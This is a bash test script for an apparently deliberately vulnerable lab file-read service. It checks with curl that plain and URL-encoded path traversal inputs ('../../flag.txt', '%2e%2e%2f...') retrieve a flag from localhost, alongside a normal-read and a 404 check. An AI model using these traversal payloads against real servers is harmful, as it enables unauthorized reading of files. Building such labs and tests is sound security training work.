#!/usr/bin/env bash
set -e
DC=$(docker compose version &>/dev/null && echo "docker compose" || echo "docker-compose")

$DC down 2>/dev/null || true
$DC up --build -d
trap "$DC down" EXIT
sleep 3

PORT=8082
FAIL=0

# 1. Normal file read works
OUT=$(curl -sf "http://localhost:$PORT/file?name=readme.txt")
if echo "$OUT" | grep -qi "welcome"; then
  echo "[+] PASS: normal file read works"
else
  echo "[-] FAIL: normal file read failed: $OUT"; FAIL=1
fi

# 2. Traversal with ../
OUT=$(curl -sf "http://localhost:$PORT/file?name=../../flag.txt")
if echo "$OUT" | grep -qE 'POC\{[0-9a-f]{32}\}'; then
  echo "[+] PASS: ../ traversal captured flag"
else
  echo "[-] FAIL (../): $OUT"; FAIL=1
fi

# 3. URL-encoded traversal %2e%2e%2f
OUT=$(curl -sf "http://localhost:$PORT/file?name=%2e%2e%2f%2e%2e%2fflag.txt")
if echo "$OUT" | grep -qE 'POC\{[0-9a-f]{32}\}'; then
  echo "[+] PASS: URL-encoded traversal captured flag"
else
  echo "[-] FAIL (encoded): $OUT"; FAIL=1
fi

# 4. Nonexistent file returns 404
STATUS=$(curl -s -o /dev/null -w "%{http_code}" "http://localhost:$PORT/file?name=nosuchfile.txt")
if [ "$STATUS" = "404" ]; then
  echo "[+] PASS: missing file returns 404"
else
  echo "[-] FAIL: expected 404, got $STATUS"; FAIL=1
fi

if [ "$FAIL" -eq 0 ]; then
  echo "[+] All tests passed"
  exit 0
else
  echo "[-] One or more tests failed"
  exit 1
fi
